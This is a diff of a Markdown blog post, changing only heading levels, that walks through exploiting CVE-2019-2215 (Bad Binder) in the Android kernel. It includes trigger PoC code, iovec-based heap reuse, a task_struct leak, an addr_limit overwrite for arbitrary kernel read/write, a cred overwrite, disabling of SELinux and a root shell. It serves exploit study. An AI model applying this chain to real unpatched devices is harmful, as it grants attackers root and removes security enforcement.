@@ -6,21 +6,21 @@ tags: [nday, iovec, addr_limit]
 mermaid: true
 ---
 
-# Overview
+## Overview
 
 Bad Binder (`CVE-2019-2215`) is a `UaF` in `Binder` (Android IPC) and `epoll` (Async IO). This blog will go over why there is use-after-free (UaF) and how we can use UaF to achieve arbitrary read/write and perform a Privilege Escalation (PE).
 
-# Exploit
+## Exploit
 
 Exploit for this writeup will be hosted [here](https://github.com/elbiazo/CVE-2019-2215)
 
-# Environment Setup
+## Environment Setup
 
 Since this bug is in `Binder` and doesn't require vendor specific kernel module, we can use `goldfish` kernel in `AVD` (Android Emulator Virtual Devices). It will be for `Intel x64` CPU but it should work with `Arm` CPU with minor update since this exploit is data only. Things like fields in structure might be different. [HackSysTeam's Bad Binder Exploitation Workshop](https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html). Have good tutorial on how to set this environment.
 
-# Root Cause Analysis
+## Root Cause Analysis
 
-## TL;DR Summary
+### TL;DR Summary
 
 1. `fd = open("/dev/binder", O_RDONLY);` Allocates `binder_thread.wait` which is linked list.
 2. `epfd = epoll_create(1000);` Creates `epoll` structure.
@@ -29,7 +29,7 @@ Since this bug is in `Binder` and doesn't require vendor specific kernel module,
 5. `epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);` Will try to **unlink** `epoll_entry` by calling `__list_del()`. This **unlinking** gives you ability to write `0x10` bytes to where `binder_thread.wait` was.
 
 
-## [Trigger PoC](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html)
+### [Trigger PoC](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html)
 
 ```c
 // From Project Zero blog 
@@ -65,20 +65,20 @@ int main()
 }
 ```
 
-## Allocations
+### Allocations
 
-### High Level Flowchart
+#### High Level Flowchart
 
 ![](/assets/img/2023-05-27-17-09-41.png)
 
-### Opening Binder
+#### Opening Binder
 
 ```c
 // Create binder_thread structure
 fd = open("/dev/binder", O_RDONLY);
 ```
 
-#### Allocating `binder_proc`
+##### Allocating `binder_proc`
 
 ```mermaid
 flowchart LR
@@ -86,14 +86,14 @@ f1["open"] --> f2["binder_open"] --> f3["kzalloc"]
 ```
 Allocates `struct binder_proc *proc`. This will get used to create `binder_thread` **later**.
 
-### Creating epoll
+#### Creating epoll
 
 ```c
 // size for epoll_create can be any uint32_t > 0
 epfd = epoll_create(1000);
 ```
 
-#### Allocating `eventpoll`
+##### Allocating `eventpoll`
 
 ```mermaid
 flowchart LR
@@ -102,14 +102,14 @@ f1[poll_create] --> epoll_create1 --> ep_alloc
 Allocates `struct eventpoll *ep`. This will eventually create and link `epoll_entry` when `
 `epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event)` is called.
 
-### Adding Binder to epoll
+#### Adding Binder to epoll
 
 ```c
 // Link binder_thread.wait to epoll_entry.whead
 epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
 ```
 
-#### Allocating epitem (eventpoll item) and linking to eventpoll
+##### Allocating epitem (eventpoll item) and linking to eventpoll
 
 ```mermaid
 flowchart LR
@@ -122,7 +122,7 @@ If its hasn't created before, it wil create epi (eventpoll item) and **link** it
 
 ![](/assets/img/2023-05-27-16-40-56.png)
 
-#### Allocating binder_thread
+##### Allocating binder_thread
 
 Continuing from `ep_insert` above
 
@@ -133,7 +133,7 @@ f1[ep_insert] --> f2["init_poll_func_ptr(&epq.pt, ep_ptable_queue_proc)"] --> f3
 1. `init_poll_func_ptr(&epq.pt, ep_ptable_queue_proc)` sets `epq.pt._qproc` to `ep_ptable_queue_proc`
 2. `binder_get_thread`  will allocate binder_thread
 
-#### Allocating eppoll_entry 
+##### Allocating eppoll_entry 
 
 Continuing from `binder_poll` above
 ```mermaid
@@ -144,7 +144,7 @@ f1[binder_poll] --> f2["poll_wait(flip, &thread->wait, wait)"] --> f3["p->_qproc
 1. poll_wait pass `thread->wait` as parameter. This is list_queue that will be linked to `epoll_entry` in next step. If you remember this is the pointer where `UaF` happens
 * `p->_qproc` was set as `ep_ptable_queue_proc` from previous step
 
-#### Linking epitem -> epoll_entry -> binder_thread
+##### Linking epitem -> epoll_entry -> binder_thread
 
 Continuation from `ep_ptable_queue_proc` from before
 
@@ -168,7 +168,7 @@ f1[epi.pwqlist] --> pwq.wait --> binder_thread.wait
 
 ![](/assets/img/2023-05-27-16-41-36.png)
 
-## Free
+### Free
 
 ```c
 // Free binder_thread.wait
@@ -182,7 +182,7 @@ binder_ioctl --> binder_thread_release --> binder_thread_dec_tmp_ref --> binder_
 
 This will free binder_thread structure
 
-## Use after Free (UaF)
+### Use after Free (UaF)
 
 ```c
 // Unlink epoll_entry.whead causing UaF
@@ -201,7 +201,7 @@ flowchart TD
 f1[epi.pwqlist] --> fp["pwq.wait points to where binder_thread.wait used to be"]--> fb["freed binder_thread.wait"]
 ```
 
-### list_del operation
+#### list_del operation
 
 ```mermaid
 flowchart LR
@@ -235,15 +235,15 @@ If we can allocate kmalloc that matches binder_thread size and do `list_del`, we
 *(new_struct+0xa8) = new_struct+0xa0
 ```
 
-# Exploitation
+## Exploitation
 
 First, to use this `UaF`, we would need to find interesting struct that matches `struct binder_thread`'s `kmalloc` size which is `kmalloc-512`.
 
-## Vectored I/O
+### Vectored I/O
 
 Vectored I/O (iov) is a way to send multiple buffer with single function. This is great because it will use less syscalls then calling `write` one by one. 
 
-### [Example from Wiki](https://en.wikipedia.org/wiki/Vectored_I/O)
+#### [Example from Wiki](https://en.wikipedia.org/wiki/Vectored_I/O)
 
 ```c
 #include <stdio.h>
@@ -280,11 +280,11 @@ output:
 Hello, Wikipedia Community!
 ```
 
-### Vectored I/O Internals
+#### Vectored I/O Internals
 
 The reason why `iovec` is interesting is due to how array of `struct iovec` gets allocated in kernel. For example above, will create `kmalloc-64` (in Linux) and `kmalloc-128` (In Android. Smallest cache size). Therefore, if we can make enough `iovecs` we should be able to allocate `kmalloc-512` to get placed on where `binder_thread` used to be.
 
-### Allocating Any kmalloc size
+#### Allocating Any kmalloc size
 
 `struct iovec` is `16` bytes.
 
@@ -306,7 +306,7 @@ flowchart TD
 writev --> vfs_writev --> import_iovec --> f1["rw_copy_check_uvector"] --> rw_copy_check_uvector --> f2["iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL)"]
 ```
 
-## Leaking task_struct
+### Leaking task_struct
 
 ```c
 void BadBinder::leak_task_struct()
@@ -316,7 +316,7 @@ void BadBinder::leak_task_struct()
 ![](/assets/img/2023-05-27-16-42-06.png)
 
 
-### Initializing for task_struct leak
+#### Initializing for task_struct leak
 ```c
 // Creates mmap with addr 0x1_0000_0000 and set m_lock_page
 create_lock_page(); 
@@ -338,7 +338,7 @@ iovecs[11].iov_len = PAGE_SIZE;
 epoll_add(epfd, binder_fd);
 ```
 
-#### create_lock_page()
+##### create_lock_page()
 
 ```c
 void BadBinder::create_lock_page()
@@ -362,7 +362,7 @@ struct wait_queue_head {
 };
 ```
 
-#### Creating iovecs
+##### Creating iovecs
 
 ```c
 struct iovec iovecs[25] = {0};
@@ -370,7 +370,7 @@ struct iovec iovecs[25] = {0};
 
 Create `struct iovec iovecs[25]`. 25 * 16 `(sizeof(iovec))` = 400 bytes which means it will be allocated in `kmalloc-512`. There is reason why it is **400**. This will be explained later.
 
-#### Allocate binder and epoll struct
+##### Allocate binder and epoll struct
 
 ```c
 int binder_fd = open_binder();
@@ -379,7 +379,7 @@ int epfd = create_epoll();
 
 We need these so that it can create `struct binder_thread` and `struct eventpoll`
 
-#### Create pipes
+##### Create pipes
 
 ```c
 pipe(pipe_fd);
@@ -388,7 +388,7 @@ fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE)
 
 Create a `pipe` so we can have IPC between `parent` and `child` from `fork`. Then set pipe size to PAGE_SIZE (0x1000). For each read, it will be PAGE_SIZE.
 
-#### Set iovecs
+##### Set iovecs
 
 ```c
 iovecs[10].iov_base = m_lock_page; // binder_thread->wait.lock
@@ -427,7 +427,7 @@ which is equivalent to
 ```
 
 
-### Linking binder_thread and eppoll_event
+#### Linking binder_thread and eppoll_event
 
 ```c
 epoll_add(epfd, binder_fd);
@@ -435,7 +435,7 @@ epoll_add(epfd, binder_fd);
 
 Connecting structure together. Explained at  [Linking epitem -> epoll_entry -> binder_thread](#linking-epitem---epoll_entry---binder_thread)
 
-### Forking
+#### Forking
 
 ```c
 pid_t leak_pid = fork();
@@ -443,7 +443,7 @@ pid_t leak_pid = fork();
 
 We will now have `child` and `parent` happening at same time. But first we will look at `parent` because `child` will `sleep(2)`.
 
-#### (Parent Process) Free binder_thread and Allocate Iovecs
+##### (Parent Process) Free binder_thread and Allocate Iovecs
 ```c
 binder_thread_exit(binder_fd);
 // Should wrote PAGE_SIZE*2 since we have two iovec with PAGE_SIZE
@@ -454,7 +454,7 @@ This will free `binder_thread` which will leave `kmalloc-512` cache freed. We fi
 
 `writev` should be blocking until child does `read` with `PAGE_SIZE` since we set `pipe` to `PAGE_SIZE`
 
-#### (Child Process)  Cause unlinking 
+##### (Child Process)  Cause unlinking 
 
 ```c
 sleep(2); // Block so parent can setup iovecs kmalloc
@@ -474,7 +474,7 @@ iovecs[10].iov_len = iovecs_kmalloc_ptr+0xa8
 iovecs[11].iov_base = iovecs_kmalloc_ptr+0xa8
 ```
 
-#### (Parent Process) Read task_struct
+##### (Parent Process) Read task_struct
 
 ```c
 // Read iovecs[11]
@@ -517,7 +517,7 @@ struct binder_thread {
 
 When we read the data, it will be from where `binder_thread.wait.next` used to be which is offset `0xa8`.  If you want to to get to task_struct you would need to get `uint64_t` of `data_buffer+0xe8`. `0xe8` is from `task_struct_offset (0x190)- wait.next (0xa8)`.
 
-## Overriding addr_limit
+### Overriding addr_limit
 
 In `task_struct` there is a field named `addr_limit` which is used to validate where user process can write/read to/from. We know that higher virtual address is used for kernel address. If we can override this field with `0xFFFFFFFFFFFFFFFE`, we should be able to write to any address giving us `Arbitary R/W`. The reason why it is `0xFFFFFFFFFFFFFFFE` instead of `0xFFFFFFFFFFFFFFFF` is explained in these blog. [duasynt](https://duasynt.com/blog/android-uao-kernel-expl-mitigation)and [HackSysTeam](https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer)
 Another gotcha are that we can't use `readv` to write to our `iovecs`. The reason being is that `readv` will not process one `iovec`. This means that when you try to read data to `iovecs`, it will try to copy all sum of `iov_len` to `iovecs[10].iov_base`. And if you remember from [Child Process Cause unlinking](#child-process--cause-unlinking), `iovecs[10].iov_len` becomes `binder_thread_ptr` which is really big number. Therefore, it will just skip out on processing `iovecs[11]`.
@@ -546,7 +546,7 @@ static size_t copy_page_to_iter_iovec(struct page *page, size_t offset, size_t b
 
 In [Project Zero blog](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html), they use `recvmsg` instead since it allows blocking by passing `MSG_WAITALL` flag.
 
-### Initializing for Overriding addr_limit
+#### Initializing for Overriding addr_limit
 
 ```c
 struct msghdr message = {nullptr};
@@ -561,7 +561,7 @@ write(sock_fd[1], junk_sock_data, sizeof(junk_sock_data));// should sent 1 bytes
 
 Similar setup to [initializing for task_struct leak](#initializing-for-task_struct-leak). Difference is we use `socketpair` instead of `pipe` so we can use `recvmsg`. Also, we have to send some junk data so that when `recvmsg` is called, it processes the junk data and kmalloc `iovecs` in kernel.
 
-### Setting up iovecs
+#### Setting up iovecs
 
 ```c
 iovecs[10].iov_base = m_lock_page;            // binder_thread->wait.lock
@@ -607,7 +607,7 @@ iovecs[IOVEC_WQ_INDEX + 2].iov_len = 0x8;
 
 Third iovec will be used to override `addr_limit`. `iov_base: 0x42424242` will be replace with `addr_limit_ptr` address in `child` process. It will go over more about this down the road.
 
-### Linking binder_thread and eppoll_event
+#### Linking binder_thread and eppoll_event
 
 ```c
 epoll_add(epfd, binder_fd);
@@ -615,7 +615,7 @@ epoll_add(epfd, binder_fd);
 
 Connecting structure together. Explained at [Linking epitem -> epoll_entry -> binder_thread](#linking-epitem---epoll_entry---binder_thread)
 
-### Forking
+#### Forking
 
 ```c
 pid_t child_pid = fork();
@@ -623,7 +623,7 @@ pid_t child_pid = fork();
 
 We will now have `child` and `parent` happening at same time. But first we will look at `parent` because `child` will `sleep(2)`.
 
-#### (Parent) Free binder_thread and block via recvmsg
+##### (Parent) Free binder_thread and block via recvmsg
 
 ```c
 binder_thread_exit(binder_fd);
@@ -636,7 +636,7 @@ wait(nullptr);
 
 Frees `binder_thread` and waits for all `iovecs` to be `write` from `child` process. Currently, it processed `iovecs[10]` which is junk data with `iov_len` of `1`.
 
-#### (Child) Unlink then write to `iovecs[11]`
+##### (Child) Unlink then write to `iovecs[11]`
 
 ```c
 static uint64_t override_binder_thread_wait[] = {
@@ -673,7 +673,7 @@ The extra write which is `0xFFFFFFFFFFFFFFFE` will store that in `iovecs[1].iov_
 **Red is where it have been replaced with override_binder_thread_wait**
 ![](/assets/img/2023-05-27-16-45-25.png)
 
-#### (Parent) Unblocked recvmsg
+##### (Parent) Unblocked recvmsg
 
 ```c
 ssize_t bytes_received = recvmsg(sock_fd[0], &message, MSG_WAITALL);
@@ -692,7 +692,7 @@ wait(nullptr);
 
 Since child process have sent correct amount of bytes `write`, it should have been unblocked. Also we have `addr_limit_ptr` to set to `0xFFFFFFFFFFFFFFFE`
 
-## Arbitrary R/W
+### Arbitrary R/W
 
 Since we have overwritten `addr_limit` we should be able to `write` and `read` anywhere.
 
@@ -732,7 +732,7 @@ void BadBinder::arb_write(char *addr, char *buf, size_t size)
 
 Here we just use `pipe` because its convenient to use pipe to `write` and `read` then opening something like file to pass to `write` and `read`. You can just use `STDOUT` or `STDIN` FD to do this as well but then it will just `write/recv` from terminal which is not ideal.
 
-## Getting Kernel Base to get selinux_enforcing Address
+### Getting Kernel Base to get selinux_enforcing Address
 
 Since we now have `arbitary R/W` as well as `task_struct_ptr`, we should be able to get kernel base by reading `nsproxy` field of task_struct by substracting `nsproxy_ptr - nsproxy_offset_to_kbase`).
 
@@ -751,7 +751,7 @@ void BadBinder::get_kbase()
 }
 ```
 
-## Overriding task_struct.cred with init_cred
+### Overriding task_struct.cred with init_cred
 
 ```c
 // struct cred init_cred = {
@@ -803,7 +803,7 @@ void BadBinder::override_cred_with_init_cred()
 
 Since we have `arb r/w` just imitate `commit_creds(prepare_kernel_cred(0))`.
 
-## Disable selinux_enforcing
+### Disable selinux_enforcing
 
 ```c
 void BadBinder::override_selinux_enforcing()
@@ -815,7 +815,7 @@ void BadBinder::override_selinux_enforcing()
 
 To disable `selinux`, we just disable it by writing 0 to `selinux_enforcing` which is `uint32_t`
 
-## Spawn Shell
+### Spawn Shell
 
 ```c
 void BadBinder::spawn_shell()
@@ -830,22 +830,22 @@ Spawn shell on same process and we should have root as well as disabled selinux!
 ![](/assets/img/2023-05-27-16-45-43.png)
 ![](/assets/img/2023-05-27-16-45-53.png)
 
-# Closing Statement
+## Closing Statement
 
 This was my first introduction to Android Kernel Exploitation. Before this, I have done some Linux Kernel exploitation and it seems pretty similar to it except with less kernel structure I can call which makes it harder. Also big shout out to `HackSysTeam`. With their workshop I realize how visualization and neat code organization can make you understand how exploitation works way easier. 
 
-# Resources
+## Resources
 
-## Bad Binder
+### Bad Binder
 
 * [Google Project Zero Writeup](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html)
 * [HackSysTeam Bad Binder Explotation Workshop](https://cloudfuzz.github.io/android-kernel-exploitation/)
 
-## Vector I/O
+### Vector I/O
 
 * [AoE Unconventional UaF](https://youtu.be/U2qvK1hJ6zg)
 
-## Arm Mitigations
+### Arm Mitigations
 
-### UAO and PAN
+#### UAO and PAN
 * https://duasynt.com/blog/android-uao-kernel-expl-mitigation
